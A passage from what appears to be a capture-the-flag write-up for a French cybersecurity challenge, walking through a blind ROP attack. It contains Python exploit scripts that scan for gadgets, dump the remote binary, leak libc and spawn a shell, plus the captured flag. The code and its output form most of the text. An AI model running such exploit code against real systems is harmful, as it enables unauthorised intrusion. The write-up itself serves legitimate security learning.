[0x4006b8] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb8\x06@Hello you.\nWhat is your name ?\n>>> '
[0x4006bd] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xbd\x06@\x84(\xad\xfb\nWhat is your name ?\n>>> '
[0x4006c2] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc2\x06@What is your name ?\n>>> '
[0x4006c7] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc7\x06@What is your name ?\n>>> '
[0x4006cc] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcc\x06@Bye!\n'
[0x4006d1] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd1\x06@\x84(\xad\xfb\n'
[0x4006d6] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd6\x06@'
[0x4006db] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdb\x06@'
[0x4006e2] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe2\x06@'
[0x4006e3] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe3\x06@'
[0x4006e5] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe5\x06@'
[0x4006e6] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe6\x06@'
[0x40073b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;\x07@Hello you.\nWhat is your name ?\n>>> '
[0x400742] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaB\x07@'
[0x400743] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaC\x07@'
[0x400758] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX\x07@'
```

If we read carefully, we can notice the `[0x400668] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah\x06@>>> '` gadget.
It's a very good stop gadget because it's the only gadget which prints: `Thanks + padding + return_address_upto_null_byte + >>> `.
And so for our attack we will use it.

### Brop gadget

Since we got the stop gadget, everything is easier. We just have to scan the .text of the remote binary to find the brop gadget which is basically the end of the csu in most of the binaries. It's easy to find because it's a pop of six qword like that:
```x86asm
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
```

So we use a `probe + trap * 6 + stop + trap*20` payload to find these kinf od gadgets.
And so here is the script:
```py
def unpadd(s):
    return s.split(b"\x00")[0]

def is_stop(s, ip, padding):
    return (ip not in STOP_GADGETS) and (s == b"Thanks " + padding + unpadd(p64(ip)) + b">>> ") 

def try_jmp(s):
    while True:
        try:
            io = start()
            io.write(s)
            resp = io.recv(500, timeout=30.0)[35:]
            break
        except:
            print(f"STOP: {sys.exc_info()[0]}")
            resp = -1 
            break

    return resp

def find_brop(padding):
    base = 0x400000

    for i in range(0, 0x2000):
        buf = padding + p64(base + i) + p64(0xdeadbeef) * 6 + p64(STOP_GADGETS[0])
        resp = try_jmp(buf)
        if is_stop(resp, base+i, padding):
            print(f"Output: {resp}, leak: {hex(int.from_bytes(p64(base + i), 'little'))}")
            break

        if not i % 35:
            print(f"_ - {hex(i)}")

    return base + i

find_brop("a"*40)
```
Which returns:
```
$ ./solve.py
_ - 0x0
_ - 0x23
_ - 0x46
_ - 0x69
_ - 0x8c
_ - 0xaf
_ - 0xd2
_ - 0xf5
_ - 0x118
_ - 0x13b
_ - 0x15e
_ - 0x181
_ - 0x1a4
_ - 0x1c7
_ - 0x1ea
_ - 0x20d
_ - 0x230
_ - 0x253
_ - 0x276
_ - 0x299
_ - 0x2bc
_ - 0x2df
_ - 0x302
_ - 0x325
_ - 0x348
_ - 0x36b
_ - 0x38e
_ - 0x3b1
_ - 0x3d4
_ - 0x3f7
_ - 0x41a
_ - 0x43d
_ - 0x460
_ - 0x483
_ - 0x4a6
_ - 0x4c9
_ - 0x4ec
_ - 0x50f
_ - 0x532
_ - 0x555
_ - 0x578
_ - 0x59b
_ - 0x5be
_ - 0x5e1
_ - 0x604
_ - 0x627
_ - 0x64a
_ - 0x66d
_ - 0x690
_ - 0x6b3
_ - 0x6d6
_ - 0x6f9
_ - 0x71c
Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\x07@>>> ', leak: 0x40073a
```

Since we got this gadget we can control `rdi` and `rsi` because of some misaligned instructions !

### Procedure linkage table (PLT)

The next step would be to leak the PLT to see if there is a puts, printf, or write functions.
To find the PLT there is three rules:
- The addresses of each stub are 16 bytes aligned
- If we jmp one time on a candidate we can check it's a PLT entry by jumping at `entry+6` which is the address of the slowpath jump in the GOT. And so the behaviour should be the same.
- We can give arguments like valid pointers in `rdi` and `rsi` to identify functions like puts, strcmp etc.

I used so a payload's structure like this: `padding + POP_RDI + 0x400000 + POP_RSI_R15 + 0x400000 + probe + stop + trap`
That's how I developped this function:
```py
POP_RDI = CSU_POP+0x9
POP_RSI_R15 = CSU_POP+0x7

def unpadd(s):
    return s.split(b"\x00")[0]

def is_stop(s, ip, padding):
    return (ip not in STOP_GADGETS) and (s == b"Thanks " + padding + unpadd(p64(ip)) + b">>> ") 

def try_jmp(s):
    while True:
        try:
            io = start()
            io.write(s)
            resp = io.recv(500, timeout=30.0)[35:]
            break
        except:
            print(f"STOP: {sys.exc_info()[0]}")
            resp = -1 
            break

    return resp

def find_plt(padding):
    base = 0x400000 
    s = 0 

    for i in range(0x0, 0x3000, 0x10):
        resp1 = try_jmp(padding + p64(POP_RDI) + p64(0x400000) + p64(POP_RSI_R15) + p64(0x400000)*2 + p64(base+i) + p64(STOP_GADGETS[0]) + p64(0xdeadbeef)) # I used the base address because it's an recognizable pattern

        if is_stop(resp1, base+i, padding):
            print(f"Output: {resp1.hex()}, leak: {hex(int.from_bytes(p64(base + i), 'little'))}")

        elif len(resp1):
            print(f"[{hex(base+i)}] Out: {resp1.hex()}")
```
And we got this:
```
$ ./solve.py
[0x400500] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307407f454c460201010a3e3e3e20
[0x400510] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307407f454c460201013e3e3e20
[0x400520] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
[0x400570] Out: 5468616e6b73204141414141414141414141414141414141414141414141414141414141414141414141414141414143074048656c6c6f20796f752e0a5768617420697320796f7572206e616d65203f0a3e3e3e20
[0x4005d0] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
[0x400610] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
[0x400630] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
[0x400640] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
[0x4006e0] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
[0x400750] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
```
Awesome ! We got a leak of the binary in two gadgets !

### Leaking the binary

Since we can leak an arbitrary location it's really easier !
We can see that the patter which leaks is like: `Thanks + padding + unpadd(p64(POP_RDI)) + leak_upto_null_byte`.
So we can leak all the binary from the base address:
```py
STOP_GADGETS = [0x400668]
POP_RDI = CSU_POP+0x9
POP_RSI_R15 = CSU_POP+0x7

def unpadd(s):
    return s.split(b"\x00")[0]

def try_jmp(s):
    while True:
        try:
            io = start()
            io.write(s)
            resp = io.recv(500, timeout=30.0)[35:]
            break
        except:
            print(f"STOP: {sys.exc_info()[0]}")
            resp = -1 
            break

    return resp

def dump_binary(padding, base):
    gadget_leak = 0x400510
    i = 0 
    buf = b""

    pattern = b"Thanks " + padding + unpadd(p64(POP_RDI))

    f = open("leet_dump.bin", "ab")

    while base+i < 0x400fff: # guessed end to the binary .text
        resp1 = try_jmp(padding + p64(POP_RDI) + p64(base+i) + p64(POP_RSI_R15) + p64(0x0)*2 + p64(gadget_leak) + p64(STOP_GADGETS[0]) + p64(0xdeadbeef))

        if not len(resp1): # somtimes there is no repsonse
            continue

        leak = resp1[len(pattern):resp1.index(b'>>> ')] # get the leaked part
        
        if not len(leak): # if no leak it means it's a null byte
            buf += b"\x00"
            print(f"[*] recv @ {hex(base+i)}: 0x00")
            i += 1
        else: # else we got raw data leaked
            buf += leak
            print(f"[*] recv @ {hex(base+i)}: {leak.hex()}")

            i = i + len(leak)

        if len(buf) >= 0x100: # we write bytes to the file each 0x100 bytes
            f.write(buf)
            buf = b""
            print("Buffering ..")
```
Because of my connection I have to relaunch the script with a different base address to dump the whole binary but anyway, it works !
```
$ ./solve.py
[skip]
[*] recv @ 0x400fff: 0x00
STOP: <class 'KeyboardInterrupt'>
$ ./solve.py
```

Since we dumped the binary we just need to build a classic ropchain by leaking the address of `FFLUSH` in the GOT and then compute the base address of the libc. It's interesting to see that we don't know what libc it is. So we can use [this](https://libc.blukat.me/) to find from the offset of fflush and read, the right version. Which gives:
```
__libc_start_main 	0x021a50 	0x0
system 	0x041490 	0x1fa40
fflush 	0x069ab0 	0x48060
open 	0x0db950 	0xb9f00
read 	0x0dbb90 	0xba140
write 	0x0dbbf0 	0xba1a0
str_bin_sh 	0x1633e8 	0x141998
```

## Put everything together

I'll no detail a lot the final part because it's a basic rop payload. But since we got the right gadgets from the leaked binary, it's very easy. We have to notice that this exploit is not 100% reiable, if the address of FFLUSH in the GOT has a NULL byte the exploit will not work. Here is the final function:
```py
STOP_GADGETS = [0x400668]

CSU_POP = 0x40073a
POP_RDI = CSU_POP+0x9
POP_RSI_R15 = CSU_POP+0x7

GADGET_LEAK = 0x400510
FFLUSH_GOT = 0x400000 + 0x200FF0
FFLUSH_OFFSET = 0x069ab0
OFFT_BINSH = 0x1633e8

SYSTEM = 0x041490

def try_jmp_flow(s):
    while True:
        try:
            io = start()
            io.write(s)
            resp = io.recv(500, timeout=30.0)[35:]
            break
        except:
            print(f"STOP: {sys.exc_info()[0]}")
            resp = -1 
            break

    return resp, io

def flow(padding):
    payload = padding
    payload += p64(POP_RDI)
    payload += p64(FFLUSH_GOT)
    payload += p64(POP_RSI_R15) + p64(0xffffffffffffffff)*2
    payload += p64(GADGET_LEAK)
    payload += p64(0x400000 + 0x656) # ret2main

    pattern = b"Thanks " + padding + unpadd(p64(POP_RDI))
    resp_tmp, io = try_jmp_flow(payload)
    print(resp_tmp)
    leak_fflush = int.from_bytes(resp_tmp[len(pattern):resp_tmp.index(b'What is')], 'little')

    libc = leak_fflush - FFLUSH_OFFSET 
    print(f"libc @ {hex(libc)}")

    payload = padding
    payload += p64(POP_RDI)
    payload += p64(libc + OFFT_BINSH)
    payload += p64(libc + SYSTEM)

    io.send(payload)
    io.interactive()

flow("a"*40)
```

And when we run it, we got a shell yeeeeeah !

```
$ ./solve.py
b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC\x07@\xb0J\xa2\xd7<\x7fWhat is your name ?\n>>> '
libc @ 0x7f3cd79bb000
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag
FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}
```

Here is the final script:
```py
#!/usr/bin/python3
from pwn import *

STOP_GADGETS = [0x400668]

CSU_POP = 0x40073a
POP_RDI = CSU_POP+0x9
POP_RSI_R15 = CSU_POP+0x7

GADGET_LEAK = 0x400510
FFLUSH_GOT = 0x400000 + 0x200FF0
FFLUSH_OFFSET = 0x069ab0
OFFT_BINSH = 0x1633e8

SYSTEM = 0x041490 

"""
__libc_start_main 	0x021a50 	0x0
system 	0x041490 	0x1fa40
fflush 	0x069ab0 	0x48060
open 	0x0db950 	0xb9f00
read 	0x0dbb90 	0xba140
write 	0x0dbbf0 	0xba1a0
str_bin_sh 	0x1633e8 	0x141998
"""

context.log_level = 'error'

def start():
    return remote("challenges2.france-cybersecurity-challenge.fr", 4008)

def padd(s):
    return s + b"\x00"*(8-(len(s) % 8))

def unpadd(s):
    return s.split(b"\x00")[0]

def is_crash(s):
    return not (len(s) == 0)

def is_stop(s, ip, padding):
    return (ip not in STOP_GADGETS) and (s == b"Thanks " + padding + unpadd(p64(ip)) + b">>> ")

def jmp(av):
    io = start()
    io.write(av)
    return io.recvall(timeout=5.0)

def find_padding(p=b""):
    padding = p + b"\x90"
    print(f"[*] sending: {padding}")
    resp = jmp(padding)
    print(f"[*] recv: {resp}")
    while b"Hello you.\nWhat is your name ?\n>>> Thanks " + padding in resp:
        return find_padding(p=padding)
    return padding[:len(padding)-1] # minus one char because we do not want that padding overwrite the return address

def leak2(padding: str, leak1=b""):
    for i in range(256):
        buf = padding + leak1 + p8(i)
        resp = try_jmp(buf)
        # print(f"Trying on {hex(int.from_bytes(leak1+p8(i), 'little') << (64 - counter*8))}")
        if len(resp):
            print(f"[{hex(int.from_bytes(padd(leak1+p8(i)), 'little'))}] Output: {resp}")
            if len(leak1) < 8:
                leak2(padding, leak1=leak1+p8(i))
            else:
                return leak1

    return leak1

def leak2_opti(padding: str):
    base = 0x400000

    for i in range(0x2000):
        buf = padding + p64(base+i)
        resp = try_jmp(buf)
        # print(f"Trying on {hex(int.from_bytes(leak1+p8(i), 'little') << (64 - counter*8))}")
        if len(resp):
            print(f"[{hex(base+i)}] Output: {resp}")
            continue

    return leak1

def find_brop(padding):
    base = 0x400000

    for i in range(0, 0x2000):
        buf = padding + p64(base + i) + p64(0xdeadbeef) * 6 + p64(STOP_GADGETS[0])
        resp = try_jmp(buf)
        if is_stop(resp, base+i, padding):
            print(f"Output: {resp}, leak: {hex(int.from_bytes(p64(base + i), 'little'))}")
            break

        if not i % 35:
            print(f"_ - {hex(i)}")

    return base + i

def dump_binary(padding, base):
    gadget_leak = 0x400510
    i = 0 
    buf = b""

    pattern = b"Thanks " + padding + unpadd(p64(POP_RDI))

    f = open("leet_dump.bin", "ab")

    while base+i < 0x400fff:
        resp1 = try_jmp(padding + p64(POP_RDI) + p64(base+i) + p64(POP_RSI_R15) + p64(0x0)*2 + p64(gadget_leak) + p64(STOP_GADGETS[0]) + p64(0xdeadbeef))

        if not len(resp1):
            continue

        leak = resp1[len(pattern):resp1.index(b'>>> ')]
        
        if not len(leak):
            buf += b"\x00"
            print(f"[*] recv @ {hex(base+i)}: 0x00")
            i += 1
        else:
            buf += leak
            print(f"[*] recv @ {hex(base+i)}: {leak.hex()}")

            i = i + len(leak)
        
        if len(buf) >= 0x100:
            f.write(buf)
            buf = b""
            print("Buffering ..")

def find_plt(padding):
    base = 0x400000 
    s = 0 

    for i in range(0x0, 0x3000, 0x10):
        resp1 = try_jmp(padding + p64(POP_RDI) + p64(0x400000) + p64(POP_RSI_R15) + p64(0x400000)*2 + p64(base+i) + p64(STOP_GADGETS[0]) + p64(0xdeadbeef)) 

        if is_stop(resp1, base+i, padding):
            print(f"Output: {resp1.hex()}, leak: {hex(int.from_bytes(p64(base + i), 'little'))}")

        elif len(resp1):
            print(f"[{hex(base+i)}] Out: {resp1.hex()}")

def try_jmp(s):
    while True:
        try:
            io = start()
            io.write(s)
            resp = io.recv(500, timeout=30.0)[35:]
            break
        except:
            print(f"STOP: {sys.exc_info()[0]}")
            resp = -1 
            break

    return resp

def try_jmp_flow(s):
    while True:
        try:
            io = start()
            io.write(s)
            resp = io.recv(500, timeout=30.0)[35:]
            break
        except:
            print(f"STOP: {sys.exc_info()[0]}")
            resp = -1 
            break

    return resp, io

def flow(padding):
    payload = av
    payload += p64(POP_RDI)
    payload += p64(FFLUSH_GOT)
    payload += p64(POP_RSI_R15) + p64(0xffffffffffffffff)*2
    payload += p64(GADGET_LEAK)
    payload += p64(0x400000 + 0x656) # ret2main

    pattern = b"Thanks " + padding + unpadd(p64(POP_RDI))
    resp_tmp, io = try_jmp_flow(payload)
    print(resp_tmp)
    leak_fflush = int.from_bytes(resp_tmp[len(pattern):resp_tmp.index(b'What is')], 'little')

    libc = leak_fflush - FFLUSH_OFFSET 
    print(f"libc @ {hex(libc)}")

    payload = av
    payload += p64(POP_RDI)
    payload += p64(libc + OFFT_BINSH)
    payload += p64(libc + SYSTEM)

    io.send(payload)
    io.interactive()

flow("a"*40)
# FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}
```

Thanks to the creator of this very interesting challenge !